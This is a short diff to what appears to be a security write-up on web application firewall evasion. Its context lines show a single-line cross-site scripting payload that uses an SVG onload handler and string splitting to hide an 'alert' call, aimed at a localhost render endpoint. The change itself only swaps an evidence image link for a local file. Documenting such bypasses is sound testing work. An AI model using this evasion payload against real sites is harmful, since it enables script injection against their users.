@@ -42,6 +42,7 @@ Combining all the distinct evasion vectors yields a single-line final payload th
 http://localhost:9000/render?path=<svg/onload=top['al'%2B'ert']`GRID_NODE:_`%2Blocation.host>
 ```
 
+
 #### 📷 Evidence of Exploitation
 
-![WAF Evasion Success](https://raw.githubusercontent.com/panjiprasas36-star/redteam-security-/main/images/poc.png)
+![WAF Evasion Success](poc.png)
